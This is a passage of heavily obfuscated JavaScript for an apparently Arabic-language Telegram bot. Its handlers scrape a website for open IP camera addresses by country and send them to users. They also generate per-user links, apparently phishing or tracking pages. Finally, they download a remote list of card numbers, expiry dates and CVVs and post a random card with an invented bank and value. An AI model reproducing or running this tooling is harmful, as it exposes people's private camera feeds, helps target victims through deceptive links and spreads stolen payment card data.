        'SE': _0x247cf0(0x856),
        'CH': _0x247cf0(0x2b1),
        'SY': _0x247cf0(0x548),
        'TW': _0x247cf0(0x915),
        'TZ': _0x247cf0(0x88b),
        'TH': _0x247cf0(0x559),
        'TG': _0x247cf0(0x7b6),
        'TN': _0x247cf0(0x2ac),
        'TR': _0x247cf0(0x62f),
        'TM': _0x247cf0(0x963) + _0x247cf0(0x506),
        'UG': _0x247cf0(0x24b),
        'UA': _0x247cf0(0x560),
        'AE': _0x247cf0(0x256),
        'GB': _0x247cf0(0x68a),
        'US': _0x247cf0(0x579),
        'UY': _0x247cf0(0x8f5),
        'UZ': _0x247cf0(0x892) + _0x247cf0(0x631),
        'VE': _0x247cf0(0x2d0),
        'VN': _0x247cf0(0x81d),
        'ZM': _0x247cf0(0x417),
        'ZW': _0x247cf0(0x4e0),
        'GL': _0x247cf0(0x4cd),
        'KY': _0x247cf0(0x952) + _0x247cf0(0x608),
        'NI': _0x247cf0(0x3a3) + _0x247cf0(0x5e0),
        'DO': _0x247cf0(0x517) + _0x247cf0(0x245),
        'NC': _0x247cf0(0x825) + _0x247cf0(0x34a),
        'LA': _0x247cf0(0x75b),
        'TT': _0x247cf0(0x44d) + _0x247cf0(0x8fe),
        'GG': _0x247cf0(0x937),
        'GU': _0x247cf0(0x3d2),
        'GP': _0x247cf0(0x75c),
        'MG': _0x247cf0(0x936),
        'RE': _0x247cf0(0x3e6),
        'FO': _0x247cf0(0x933),
        'MD': _0x247cf0(0x2c5)
    }, camRequestCounts = {};
async function initStorage() {
    const _0x3539c3 = _0x247cf0, _0x11b154 = { 'ainER': _0x3539c3(0x7fc) };
    await storage[_0x3539c3(0x38a)](), vipUsers = await storage[_0x3539c3(0x3ab)](_0x11b154[_0x3539c3(0x8eb)]) || [];
}
async function saveVipUsers() {
    const _0x27a8a2 = _0x247cf0, _0x34e8b5 = { 'iKUuR': _0x27a8a2(0x7fc) };
    await storage[_0x27a8a2(0x8f9)](_0x34e8b5[_0x27a8a2(0x836)], vipUsers);
}
function showCountryList(_0x195ced, _0x782f20 = -0xf * -0x44 + -0x459 + 0x5d) {
    const _0x139989 = _0x247cf0, _0x17f643 = {
            'Ecrjd': function (_0x47ef73, _0x343cad) {
                return _0x47ef73 + _0x343cad;
            },
            'odFCT': function (_0x3b4571, _0xd736e9) {
                return _0x3b4571 < _0xd736e9;
            },
            'evrYx': function (_0x47425d, _0x14f51a) {
                return _0x47425d < _0x14f51a;
            },
            'vzrLH': function (_0x116ca0, _0x2faab5) {
                return _0x116ca0 + _0x2faab5;
            },
            'aOZcf': function (_0x47d6b2, _0x3c9bd6) {
                return _0x47d6b2 < _0x3c9bd6;
            },
            'wrcVG': function (_0x44ee71, _0x1c4c5f) {
                return _0x44ee71 > _0x1c4c5f;
            },
            'RJZDH': function (_0x54006c, _0x1e9ffe) {
                return _0x54006c < _0x1e9ffe;
            },
            'uxlAg': _0x139989(0x8e6),
            'JctFa': _0x139989(0x519) + 'ة:'
        };
    try {
        const _0x5a9018 = [], _0x51aca6 = Object[_0x139989(0x895)](countryTranslation), _0x55dcf9 = Object[_0x139989(0x4dd)](countryTranslation), _0x2e217b = Math[_0x139989(0x1ff)](_0x17f643[_0x139989(0x691)](_0x782f20, 0xddb + -0x1f75 + 0x11fd), _0x51aca6[_0x139989(0x934)]);
        for (let _0x328a87 = _0x782f20; _0x17f643[_0x139989(0x73d)](_0x328a87, _0x2e217b); _0x328a87 += -0x21a6 * 0x1 + 0xbcd * 0x2 + 0xa0f) {
            const _0x4cdd4d = [];
            for (let _0x50bd91 = _0x328a87; _0x17f643[_0x139989(0x8c9)](_0x50bd91, _0x17f643[_0x139989(0x7de)](_0x328a87, 0x10db + -0x114b + 0x73)) && _0x17f643[_0x139989(0x62b)](_0x50bd91, _0x2e217b); _0x50bd91++) {
                const _0x1c649d = _0x51aca6[_0x50bd91], _0x27eec2 = _0x55dcf9[_0x50bd91];
                _0x4cdd4d[_0x139989(0x4cc)]({
                    'text': _0x27eec2,
                    'callback_data': _0x1c649d
                });
            }
            _0x5a9018[_0x139989(0x4cc)](_0x4cdd4d);
        }
        const _0x41223f = [];
        _0x17f643[_0x139989(0x8e0)](_0x782f20, 0x7 * 0x1dd + -0x1 * -0xb08 + -0x1813) && _0x41223f[_0x139989(0x4cc)], _0x17f643[_0x139989(0x3b9)](_0x2e217b, _0x51aca6[_0x139989(0x934)]) && _0x41223f[_0x139989(0x4cc)]({
            'text': _0x17f643[_0x139989(0x28b)],
            'callback_data': _0x139989(0x5a4) + _0x2e217b
        }), _0x41223f[_0x139989(0x934)] && _0x5a9018[_0x139989(0x4cc)](_0x41223f), bot[_0x139989(0x326) + 'e'](_0x195ced, _0x17f643[_0x139989(0x698)], { 'reply_markup': { 'inline_keyboard': _0x5a9018 } });
    } catch (_0x1453d4) {
        bot[_0x139989(0x326) + 'e'](_0x195ced, _0x139989(0x720) + _0x139989(0x599) + _0x139989(0x801) + _0x1453d4[_0x139989(0x202)]);
    }
}
async function displayCameras(_0xd0283d, _0x147e06) {
    const _0x4ef85a = _0x247cf0, _0x33728a = {
            'fIOSv': _0x4ef85a(0x6f1) + _0x4ef85a(0x445) + _0x4ef85a(0x790),
            'TMQMl': function (_0x186d6d, _0x342cf7) {
                return _0x186d6d < _0x342cf7;
            },
            'SxFQg': function (_0x291767, _0x57d888) {
                return _0x291767 % _0x57d888;
            },
            'anHyD': _0x4ef85a(0x81f) + _0x4ef85a(0x95a) + _0x4ef85a(0x67f) + _0x4ef85a(0x215) + _0x4ef85a(0x407) + _0x4ef85a(0x5f7) + _0x4ef85a(0x308) + _0x4ef85a(0x363) + _0x4ef85a(0x236) + _0x4ef85a(0x6c4) + _0x4ef85a(0x455) + '6',
            'hPjgV': _0x4ef85a(0x549) + _0x4ef85a(0x392) + _0x4ef85a(0x656) + _0x4ef85a(0x41c) + _0x4ef85a(0x67e) + _0x4ef85a(0x372) + _0x4ef85a(0x61c) + _0x4ef85a(0x768) + _0x4ef85a(0x214) + _0x4ef85a(0x78f),
            'RkYOJ': function (_0x4f0d51, _0x133f0c, _0x3e5966) {
                return _0x4f0d51(_0x133f0c, _0x3e5966);
            },
            'eYFnj': function (_0x50ac64, _0x341d91) {
                return _0x50ac64 <= _0x341d91;
            },
            'TAeye': function (_0x17b9bc, _0x5e0115) {
                return _0x17b9bc + _0x5e0115;
            },
            'EWpjH': _0x4ef85a(0x6d5) + _0x4ef85a(0x392) + _0x4ef85a(0x656) + _0x4ef85a(0x726) + _0x4ef85a(0x857) + _0x4ef85a(0x7e1) + _0x4ef85a(0x403) + _0x4ef85a(0x94a) + _0x4ef85a(0x703) + _0x4ef85a(0x285) + _0x4ef85a(0x31d) + _0x4ef85a(0x5c5) + _0x4ef85a(0x51c) + _0x4ef85a(0x95f) + _0x4ef85a(0x45f) + _0x4ef85a(0x3f1) + _0x4ef85a(0x960) + _0x4ef85a(0x4af) + _0x4ef85a(0x278),
            'FrNYA': _0x4ef85a(0x549) + _0x4ef85a(0x392) + _0x4ef85a(0x656) + _0x4ef85a(0x41c) + _0x4ef85a(0x67e) + _0x4ef85a(0x886) + _0x4ef85a(0x722) + _0x4ef85a(0x8f8) + _0x4ef85a(0x401) + _0x4ef85a(0x641)
        };
    try {
        const _0x74fecf = await bot[_0x4ef85a(0x326) + 'e'](_0xd0283d, _0x33728a[_0x4ef85a(0x418)]), _0x654dc9 = _0x74fecf[_0x4ef85a(0x4a4)];
        for (let _0x314f98 = -0xfdd + 0x1a6b + -0xa8e; _0x33728a[_0x4ef85a(0x75f)](_0x314f98, 0x5fd + 0x2351 + -0x1 * 0x293f); _0x314f98++) {
            await bot[_0x4ef85a(0x472) + _0x4ef85a(0x710)](_0x4ef85a(0x6f1) + _0x4ef85a(0x445) + _0x4ef85a(0x87b) + '.'[_0x4ef85a(0x6ac)](_0x33728a[_0x4ef85a(0x66c)](_0x314f98, -0x1873 + 0x43 * -0x1 + 0x1a6 * 0xf)), {
                'chat_id': _0xd0283d,
                'message_id': _0x654dc9
            }), await new Promise(_0x5e3923 => setTimeout(_0x5e3923, 0x12de + -0x4f * 0x5c + 0xd6e));
        }
        const _0x457b7d = _0x4ef85a(0x85a) + _0x4ef85a(0x1d8) + _0x4ef85a(0x42a) + _0x4ef85a(0x50a) + _0x147e06, _0x3b8111 = { 'User-Agent': _0x33728a[_0x4ef85a(0x5ab)] };
        let _0x1f1ac2 = await axios[_0x4ef85a(0x3d0)](_0x457b7d, { 'headers': _0x3b8111 });
        const _0x28b6fe = _0x1f1ac2[_0x4ef85a(0x70e)][_0x4ef85a(0x7c7)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x28b6fe) {
            bot[_0x4ef85a(0x326) + 'e'](_0xd0283d, _0x33728a[_0x4ef85a(0x4be)]);
            return;
        }
        const _0x1fad56 = _0x33728a[_0x4ef85a(0x32c)](parseInt, _0x28b6fe[-0x3d8 * -0x2 + -0xc79 + 0x4ca], 0x5e * -0x66 + 0x16d2 * -0x1 + 0x3c50), _0x2b9be1 = [];
        for (let _0x13eceb = 0xb0e + 0x37 * -0x2e + 0xd * -0x17; _0x33728a[_0x4ef85a(0x7db)](_0x13eceb, _0x1fad56); _0x13eceb++) {
            _0x1f1ac2 = await axios[_0x4ef85a(0x3d0)](_0x457b7d + _0x4ef85a(0x63b) + _0x13eceb, { 'headers': _0x3b8111 });
            const _0x201d8c = _0x1f1ac2[_0x4ef85a(0x70e)][_0x4ef85a(0x7c7)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x2b9be1[_0x4ef85a(0x4cc)](..._0x201d8c);
        }
        if (_0x2b9be1[_0x4ef85a(0x934)]) {
            const _0x177293 = _0x2b9be1[_0x4ef85a(0x1e4)]((_0x2dab9a, _0x28c443) => _0x28c443 + (0x3 * 0x67a + -0x4c1 * 0x5 + 0x458) + '.\x20' + _0x2dab9a);
            for (let _0x47486d = 0x6ed + 0x1228 + -0x1 * 0x1915; _0x33728a[_0x4ef85a(0x75f)](_0x47486d, _0x177293[_0x4ef85a(0x934)]); _0x47486d += 0x2 * 0x402 + -0xe21 * 0x1 + 0x64f) {
                const _0xcb55e0 = _0x177293[_0x4ef85a(0x4a0)](_0x47486d, _0x33728a[_0x4ef85a(0x837)](_0x47486d, -0x1af0 + -0x14b6 + 0x2fd8 * 0x1));
                await bot[_0x4ef85a(0x326) + 'e'](_0xd0283d, _0xcb55e0[_0x4ef85a(0x93f)]('\x0a'));
            }
            await bot[_0x4ef85a(0x326) + 'e'](_0xd0283d, _0x33728a[_0x4ef85a(0x8d7)]);
        } else
            await bot[_0x4ef85a(0x326) + 'e'](_0xd0283d, _0x33728a[_0x4ef85a(0x714)]);
    } catch (_0x446826) {
        await bot[_0x4ef85a(0x326) + 'e'](_0xd0283d, _0x4ef85a(0x549) + _0x4ef85a(0x392) + _0x4ef85a(0x656) + _0x4ef85a(0x41c) + _0x4ef85a(0x67e) + _0x4ef85a(0x886) + _0x4ef85a(0x722) + _0x4ef85a(0x8f8) + _0x4ef85a(0x401) + _0x4ef85a(0x641));
    }
}
function isDeveloper(_0x53e925) {
    const _0x372943 = _0x247cf0, _0x2ca311 = {
            'ZpgIT': function (_0x30a094, _0x4c89e2) {
                return _0x30a094 === _0x4c89e2;
            }
        }, _0x1a14dd = 0x1ef9c39fd * -0x1 + 0xdd3 * 0x1b7cd9 + 0x1c9b07ddc;
    return _0x2ca311[_0x372943(0x45e)](_0x53e925, _0x1a14dd);
}
function showAdminPanel(_0x3db82c) {
    const _0x56923a = _0x247cf0, _0x171424 = {
            'mURxU': _0x56923a(0x3cb) + 'م:',
            'CyTda': _0x56923a(0x38f) + _0x56923a(0x65c),
            'GUqnA': _0x56923a(0x6ed),
            'mDLUd': _0x56923a(0x23f) + _0x56923a(0x65c),
            'TsVKh': _0x56923a(0x38d)
        };
    bot[_0x56923a(0x326) + 'e'](_0x3db82c, _0x171424[_0x56923a(0x1df)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x171424[_0x56923a(0x432)],
                        'callback_data': _0x171424[_0x56923a(0x3dd)]
                    }],
                [{
                        'text': _0x171424[_0x56923a(0x6c2)],
                        'callback_data': _0x171424[_0x56923a(0x67d)]
                    }]
            ]
        }
    });
}
bot[_0x247cf0(0x89b)](/\/jjjjjavayy/, _0x3b9f5e => {
    const _0x25691 = _0x247cf0, _0x4a11d1 = {
            'zuaIF': _0x25691(0x3a1) + _0x25691(0x540) + _0x25691(0x38b) + _0x25691(0x2b9) + _0x25691(0x450),
            'lhLPY': _0x25691(0x55a) + 'ي',
            'TvjOM': _0x25691(0x87a),
            'CQDvZ': _0x25691(0x4c4) + _0x25691(0x8a0),
            'EnOSc': _0x25691(0x343) + 're',
            'mxALx': _0x25691(0x81b) + 'ء',
            'PpSrJ': _0x25691(0x525)
        }, _0x1ebf71 = _0x3b9f5e[_0x25691(0x742)]['id'], _0x2431ba = _0x4a11d1[_0x25691(0x82c)];
    bot[_0x25691(0x326) + 'e'](_0x1ebf71, _0x2431ba, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x4a11d1[_0x25691(0x373)],
                        'callback_data': _0x4a11d1[_0x25691(0x4c6)]
                    }],
                [{
                        'text': _0x4a11d1[_0x25691(0x615)],
                        'callback_data': _0x4a11d1[_0x25691(0x718)]
                    }],
                [{
                        'text': _0x4a11d1[_0x25691(0x572)],
                        'callback_data': _0x4a11d1[_0x25691(0x5b9)]
                    }]
            ]
        }
    });
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0x3439db => {
    const _0x1342cc = _0x247cf0, _0x5367ff = {
            'oKVPj': function (_0x3a9954, _0x9fd033) {
                return _0x3a9954 === _0x9fd033;
            },
            'ppaAm': _0x1342cc(0x87a),
            'vYWcB': function (_0x48c14f, _0x4c8d09) {
                return _0x48c14f === _0x4c8d09;
            },
            'movAb': _0x1342cc(0x343) + 're',
            'QtkbX': _0x1342cc(0x525),
            'MlvWu': _0x1342cc(0x685) + _0x1342cc(0x490) + '\x20✅',
            'eCJUB': function (_0xcfd0df, _0x4c12ec) {
                return _0xcfd0df === _0x4c12ec;
            },
            'ICTwb': _0x1342cc(0x2a0)
        }, _0xf1b976 = _0x3439db[_0x1342cc(0x202)][_0x1342cc(0x742)]['id'];
    let _0x32d289;
    if (_0x5367ff[_0x1342cc(0x6ea)](_0x3439db[_0x1342cc(0x70e)], _0x5367ff[_0x1342cc(0x953)]))
        _0x32d289 = baseUrl + (_0x1342cc(0x441) + _0x1342cc(0x303)) + _0xf1b976 + _0x1342cc(0x59e);
    else {
        if (_0x5367ff[_0x1342cc(0x8ed)](_0x3439db[_0x1342cc(0x70e)], _0x5367ff[_0x1342cc(0x74e)]))
            _0x32d289 = baseUrl + (_0x1342cc(0x4f6) + _0x1342cc(0x303)) + _0xf1b976 + _0x1342cc(0x59e);
        else
            _0x5367ff[_0x1342cc(0x6ea)](_0x3439db[_0x1342cc(0x70e)], _0x5367ff[_0x1342cc(0x1e6)]) && (_0x32d289 = baseUrl + (_0x1342cc(0x4de) + _0x1342cc(0x303)) + _0xf1b976 + _0x1342cc(0x59e));
    }
    if (_0x32d289)
        bot[_0x1342cc(0x326) + 'e'](_0xf1b976, _0x1342cc(0x5e6) + _0x1342cc(0x2e2) + _0x32d289), bot[_0x1342cc(0x3b6) + _0x1342cc(0x226)](_0x3439db['id'], { 'text': _0x5367ff[_0x1342cc(0x880)] });
    else
        _0x5367ff[_0x1342cc(0x42c)](_0x3439db[_0x1342cc(0x70e)], _0x5367ff[_0x1342cc(0x2a1)]) && (bot[_0x1342cc(0x326) + 'e'](_0xf1b976, _0x1342cc(0x408) + _0x1342cc(0x30b) + _0x1342cc(0x84d) + _0x1342cc(0x90e) + _0x1342cc(0x4f9) + _0x1342cc(0x8df) + _0x1342cc(0x4b3) + 'ip'), bot[_0x1342cc(0x3b6) + _0x1342cc(0x226)](_0x3439db['id'], { 'text': '' }));
}), bot[_0x247cf0(0x89b)](/\/نننطسطوو/, _0x357362 => {
    const _0x1a9639 = _0x247cf0, _0x384c6e = {
            'vKiFi': _0x1a9639(0x1ea) + _0x1a9639(0x798) + _0x1a9639(0x609) + _0x1a9639(0x7a0),
            'LimDg': _0x1a9639(0x922) + _0x1a9639(0x2e5),
            'oqTKG': _0x1a9639(0x7be) + 's',
            'KIDlz': function (_0x197786, _0xdab85) {
                return _0x197786(_0xdab85);
            },
            'caEnj': function (_0x12de7a, _0x56324a) {
                return _0x12de7a(_0x56324a);
            }
        }, _0xda1020 = _0x357362[_0x1a9639(0x742)]['id'];
    bot[_0x1a9639(0x326) + 'e'](_0xda1020, _0x384c6e[_0x1a9639(0x8c2)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x384c6e[_0x1a9639(0x2f7)],
                        'callback_data': _0x384c6e[_0x1a9639(0x20e)]
                    }]]
        }
    }), _0x384c6e[_0x1a9639(0x46a)](isDeveloper, _0xda1020) && _0x384c6e[_0x1a9639(0x6e6)](showAdminPanel, _0xda1020);
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), async _0x29346b => {
    const _0x2eaf8e = _0x247cf0, _0x6981d9 = {
            'rFGys': function (_0x51d445, _0x261a3c) {
                return _0x51d445 === _0x261a3c;
            },
            'HFcLY': _0x2eaf8e(0x7be) + 's',
            'ZGwzJ': function (_0x4e5d1f, _0x85eb0f) {
                return _0x4e5d1f(_0x85eb0f);
            },
            'Ivymx': function (_0x59b25f, _0x4d4c12) {
                return _0x59b25f in _0x4d4c12;
            },
            'XktGE': function (_0x56a410, _0x2e2deb, _0x227a0a) {
                return _0x56a410(_0x2e2deb, _0x227a0a);
            },
            'XBLNm': _0x2eaf8e(0x5a4),
            'DaWzb': _0x2eaf8e(0x33d),
            'nRgAE': function (_0x1d4a1d, _0x9b8903) {
                return _0x1d4a1d - _0x9b8903;
            }
        }, _0x509e5b = _0x29346b[_0x2eaf8e(0x202)][_0x2eaf8e(0x742)]['id'];
    if (_0x6981d9[_0x2eaf8e(0x7ca)](_0x29346b[_0x2eaf8e(0x70e)], _0x6981d9[_0x2eaf8e(0x3fe)]))
        _0x6981d9[_0x2eaf8e(0x763)](showCountryList, _0x509e5b);
    else {
        if (_0x6981d9[_0x2eaf8e(0x71d)](_0x29346b[_0x2eaf8e(0x70e)], countryTranslation))
            bot[_0x2eaf8e(0x575) + _0x2eaf8e(0x2fb)](_0x509e5b, _0x29346b[_0x2eaf8e(0x202)][_0x2eaf8e(0x4a4)]), _0x6981d9[_0x2eaf8e(0x471)](displayCameras, _0x509e5b, _0x29346b[_0x2eaf8e(0x70e)]);
        else {
            if (_0x29346b[_0x2eaf8e(0x70e)][_0x2eaf8e(0x962)](_0x6981d9[_0x2eaf8e(0x7e6)])) {
                const _0x401807 = _0x6981d9[_0x2eaf8e(0x471)](parseInt, _0x29346b[_0x2eaf8e(0x70e)][_0x2eaf8e(0x5ad)]('_')[0x1 * 0x2501 + -0x19c * -0x3 + 0x29d4 * -0x1], -0x1973 + 0x1dc + 0x17a1 * 0x1);
                bot[_0x2eaf8e(0x575) + _0x2eaf8e(0x2fb)](_0x509e5b, _0x29346b[_0x2eaf8e(0x202)][_0x2eaf8e(0x4a4)]), _0x6981d9[_0x2eaf8e(0x471)](showCountryList, _0x509e5b, _0x401807);
            } else {
                if (_0x29346b[_0x2eaf8e(0x70e)][_0x2eaf8e(0x962)](_0x6981d9[_0x2eaf8e(0x85b)])) {
                    const _0x206440 = _0x6981d9[_0x2eaf8e(0x471)](parseInt, _0x29346b[_0x2eaf8e(0x70e)][_0x2eaf8e(0x5ad)]('_')[-0x22fd + -0x1da6 + 0x563 * 0xc], -0x192 * -0x9 + -0x1 * 0x89f + -0x579), _0x203d67 = Math[_0x2eaf8e(0x52c)](-0x147a + 0x1 * -0xd17 + -0xd * -0x295, _0x6981d9[_0x2eaf8e(0x76d)](_0x206440, 0x1 * 0xef2 + 0x1f79 * 0x1 + 0x23 * -0x153));
                    bot[_0x2eaf8e(0x575) + _0x2eaf8e(0x2fb)](_0x509e5b, _0x29346b[_0x2eaf8e(0x202)][_0x2eaf8e(0x4a4)]), _0x6981d9[_0x2eaf8e(0x471)](showCountryList, _0x509e5b, _0x203d67);
                }
            }
        }
    }
});
const americanBanks = [
        _0x247cf0(0x744) + _0x247cf0(0x6e7),
        _0x247cf0(0x3c9),
        _0x247cf0(0x7ae),
        _0x247cf0(0x70f) + 'o',
        _0x247cf0(0x43a) + 'e',
        _0x247cf0(0x73c),
        _0x247cf0(0x6bc),
        _0x247cf0(0x2a6),
        _0x247cf0(0x8f4) + _0x247cf0(0x5ee),
        _0x247cf0(0x4d9) + _0x247cf0(0x805)
    ], fetchVisaData = async () => {
        const _0xc87a69 = _0x247cf0, _0x1ebd91 = {
                'bSkbF': function (_0x56e232, _0x1a6d90) {
                    return _0x56e232 === _0x1a6d90;
                },
                'bTlUG': function (_0x1eb629, _0x3f6317) {
                    return _0x1eb629 * _0x3f6317;
                },
                'aCUma': _0xc87a69(0x464) + _0xc87a69(0x505) + _0xc87a69(0x591),
                'phVQS': _0xc87a69(0x2fa),
                'XkiTk': function (_0x3d80cf, _0x58195d) {
                    return _0x3d80cf + _0x58195d;
                },
                'bveXP': _0xc87a69(0x593) + _0xc87a69(0x90a) + _0xc87a69(0x677),
                'pONbT': function (_0x419266, _0x5e1c51) {
                    return _0x419266 > _0x5e1c51;
                },
                'pdgKX': function (_0x25d479, _0x3d970a) {
                    return _0x25d479 > _0x3d970a;
                },
                'eawQM': _0xc87a69(0x361) + _0xc87a69(0x4ce) + _0xc87a69(0x8db) + _0xc87a69(0x91b) + _0xc87a69(0x6ca) + _0xc87a69(0x902),
                'SgyXO': _0xc87a69(0x492) + _0xc87a69(0x5ed)
            };
        try {
            const _0x31558c = _0x1ebd91[_0xc87a69(0x611)], _0x2daa72 = await axios[_0xc87a69(0x3d0)](_0x31558c), _0x395f26 = _0x2daa72[_0xc87a69(0x70e)], _0x228ada = _0x395f26[_0xc87a69(0x4b9)]()[_0xc87a69(0x5ad)]('\x0a');
            if (_0x1ebd91[_0xc87a69(0x4b6)](_0x228ada[_0xc87a69(0x934)], -0x1cdd + 0x25 * 0xd1 + -0x4 * 0x56)) {
                const _0x52b986 = _0x228ada[_0xc87a69(0x1e4)](_0x554e8e => {
                    const _0xf72f37 = _0xc87a69, _0x381e74 = _0x554e8e[_0xf72f37(0x5ad)]('|');
                    if (_0x1ebd91[_0xf72f37(0x477)](_0x381e74[_0xf72f37(0x934)], 0x23b8 + -0x49 * -0x7c + -0x2388 * 0x2))
                        return {
                            'CardNumber': _0x381e74[-0x1 * 0x124d + 0x3d * 0x7 + 0x10a2],
                            'Expiry': _0x381e74[-0x2 * 0x536 + -0x2d6 + -0x7 * -0x1e5] + '/' + _0x381e74[-0x81 + -0x22ae + 0x2331],
                            'CVV': _0x381e74[0x2010 + -0x1dd5 + 0x47 * -0x8],
                            'Bank': americanBanks[Math[_0xf72f37(0x565)](_0x1ebd91[_0xf72f37(0x457)](Math[_0xf72f37(0x583)](), americanBanks[_0xf72f37(0x934)]))],
                            'CardType': _0x1ebd91[_0xf72f37(0x515)],
                            'Country': _0x1ebd91[_0xf72f37(0x539)],
                            'Value': '$' + _0x1ebd91[_0xf72f37(0x54d)](Math[_0xf72f37(0x565)](_0x1ebd91[_0xf72f37(0x457)](Math[_0xf72f37(0x583)](), -0x14df + 0x1264 + 0x29a)), 0x1f83 + 0x821 * 0x3 + -0x37dc)
                        };
                })[_0xc87a69(0x6d8)](Boolean);
                if (_0x1ebd91[_0xc87a69(0x5b0)](_0x52b986[_0xc87a69(0x934)], 0x8ae + -0x20 * -0x2e + 0x737 * -0x2))
                    return _0x52b986[Math[_0xc87a69(0x565)](_0x1ebd91[_0xc87a69(0x457)](Math[_0xc87a69(0x583)](), _0x52b986[_0xc87a69(0x934)]))];
            }
            return console[_0xc87a69(0x6e8)](_0x1ebd91[_0xc87a69(0x1e7)]), null;
        } catch (_0x58416c) {
            return console[_0xc87a69(0x6e8)](_0x1ebd91[_0xc87a69(0x972)], _0x58416c[_0xc87a69(0x202)]), null;
        }
    };
bot[_0x247cf0(0x89b)](/\/نكخمنتته/, _0x3f1e47 => {
    const _0x2dad6e = _0x247cf0, _0x3c9a53 = {
            'XJOJP': _0x2dad6e(0x5e1) + _0x2dad6e(0x781),
            'OABOh': _0x2dad6e(0x443) + _0x2dad6e(0x781),
            'EOqeS': _0x2dad6e(0x6d3),
            'vipEs': _0x2dad6e(0x2d8) + _0x2dad6e(0x94c) + _0x2dad6e(0x22a) + _0x2dad6e(0x8a3) + _0x2dad6e(0x63a) + _0x2dad6e(0x566) + _0x2dad6e(0x365)
        }, _0x42b473 = _0x3f1e47[_0x2dad6e(0x742)]['id'], _0x5cf7c1 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x3c9a53[_0x2dad6e(0x6a6)],
                            'callback_data': _0x3c9a53[_0x2dad6e(0x244)]
                        }]]
            },
            'parse_mode': _0x3c9a53[_0x2dad6e(0x988)]
        };
    bot[_0x2dad6e(0x326) + 'e'](_0x42b473, _0x3c9a53[_0x2dad6e(0x74a)], _0x5cf7c1);
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), async _0x247e70 => {
    const _0x42df02 = _0x247cf0, _0x5ce9c4 = {
            'JCQxV': function (_0x1e2e25, _0x26a59b) {
                return _0x1e2e25 === _0x26a59b;
            },
            'rRWUG': _0x42df02(0x443) + _0x42df02(0x781),
            'jlUMp': _0x42df02(0x627) + _0x42df02(0x268) + _0x42df02(0x271) + _0x42df02(0x206),
            'QPgUq': _0x42df02(0x627) + _0x42df02(0x268) + _0x42df02(0x978) + _0x42df02(0x391),
            'jiasr': _0x42df02(0x627) + _0x42df02(0x268) + _0x42df02(0x907) + _0x42df02(0x376),
            'QEGqS': _0x42df02(0x627) + _0x42df02(0x268) + _0x42df02(0x6e0) + _0x42df02(0x3a4),
            'CXofD': _0x42df02(0x627) + _0x42df02(0x268) + _0x42df02(0x721) + _0x42df02(0x7a4),
            'JuleY': function (_0x210eb3) {
                return _0x210eb3();
            },
            'rhoKm': _0x42df02(0x6d3),
            'wYveB': _0x42df02(0x618) + _0x42df02(0x72e) + _0x42df02(0x1f7) + _0x42df02(0x1fe) + _0x42df02(0x8ac)
        }, _0x2f7c74 = _0x247e70[_0x42df02(0x202)][_0x42df02(0x742)]['id'];
    if (_0x5ce9c4[_0x42df02(0x6d9)](_0x247e70[_0x42df02(0x70e)], _0x5ce9c4[_0x42df02(0x905)])) {
        let _0x595e2f = await bot[_0x42df02(0x326) + 'e'](_0x2f7c74, _0x5ce9c4[_0x42df02(0x30c)]);
        await new Promise(_0x2f20ea => setTimeout(_0x2f20ea, -0x2062 + 0x8 * -0x131 + 0xa * 0x495)), await bot[_0x42df02(0x472) + _0x42df02(0x710)](_0x5ce9c4[_0x42df02(0x71a)], {
            'chat_id': _0x2f7c74,
            'message_id': _0x595e2f[_0x42df02(0x4a4)]
        }), await new Promise(_0x19d106 => setTimeout(_0x19d106, -0x1c0e + 0x2286 + -0x29 * 0x10)), await bot[_0x42df02(0x472) + _0x42df02(0x710)](_0x5ce9c4[_0x42df02(0x1f6)], {
            'chat_id': _0x2f7c74,
            'message_id': _0x595e2f[_0x42df02(0x4a4)]
        }), await new Promise(_0x19589f => setTimeout(_0x19589f, -0x2432 + -0x3 * 0xd6 + 0x2a9c)), await bot[_0x42df02(0x472) + _0x42df02(0x710)](_0x5ce9c4[_0x42df02(0x3aa)], {
            'chat_id': _0x2f7c74,
            'message_id': _0x595e2f[_0x42df02(0x4a4)]
        }), await new Promise(_0x55c34b => setTimeout(_0x55c34b, 0xb9 + -0x1f * -0x1 + 0x310)), await bot[_0x42df02(0x472) + _0x42df02(0x710)](_0x5ce9c4[_0x42df02(0x522)], {
            'chat_id': _0x2f7c74,
            'message_id': _0x595e2f[_0x42df02(0x4a4)]
        }), await new Promise(_0x294cc1 => setTimeout(_0x294cc1, 0xff7 + -0x1490 + 0x881)), await bot[_0x42df02(0x575) + _0x42df02(0x2fb)](_0x2f7c74, _0x595e2f[_0x42df02(0x4a4)]);
        const _0x4fc235 = await _0x5ce9c4[_0x42df02(0x8e3)](fetchVisaData);
        if (_0x4fc235) {
            const {
                CardNumber: _0x175410,
                Expiry: _0x521067,
                CVV: _0x41c582,
                Bank: _0x2e6a1c,
                CardType: _0xfa2695,
                Country: _0x3fae19,
                Value: _0xe9d77a
            } = _0x4fc235;
            bot[_0x42df02(0x326) + 'e'](_0x2f7c74, _0x42df02(0x5af) + _0x42df02(0x647) + _0x42df02(0x8d6) + '`' + _0x175410 + (_0x42df02(0x866) + _0x42df02(0x3e3)) + _0x521067 + (_0x42df02(0x4a3) + _0x42df02(0x863)) + _0x41c582 + (_0x42df02(0x52d) + _0x42df02(0x60c)) + _0x2e6a1c + (_0x42df02(0x6b5) + _0x42df02(0x82f) + '`') + _0xfa2695 + (_0x42df02(0x1da) + _0x42df02(0x8ab)) + _0x3fae19 + (_0x42df02(0x416) + _0x42df02(0x917)) + _0xe9d77a + (_0x42df02(0x605) + _0x42df02(0x632) + _0x42df02(0x632) + _0x42df02(0x908) + _0x42df02(0x869) + _0x42df02(0x619) + _0x42df02(0x689)), { 'parse_mode': _0x5ce9c4[_0x42df02(0x1de)] });
        } else
            bot[_0x42df02(0x326) + 'e'](_0x2f7c74, _0x5ce9c4[_0x42df02(0x79d)]);
    }
});
const deleteFolderRecursive = _0xed8598 => {
    const _0x296370 = _0x247cf0, _0x5daaef = {
            'chWXi': function (_0x2421f6, _0x326dea) {
                return _0x2421f6(_0x326dea);
            }
        };
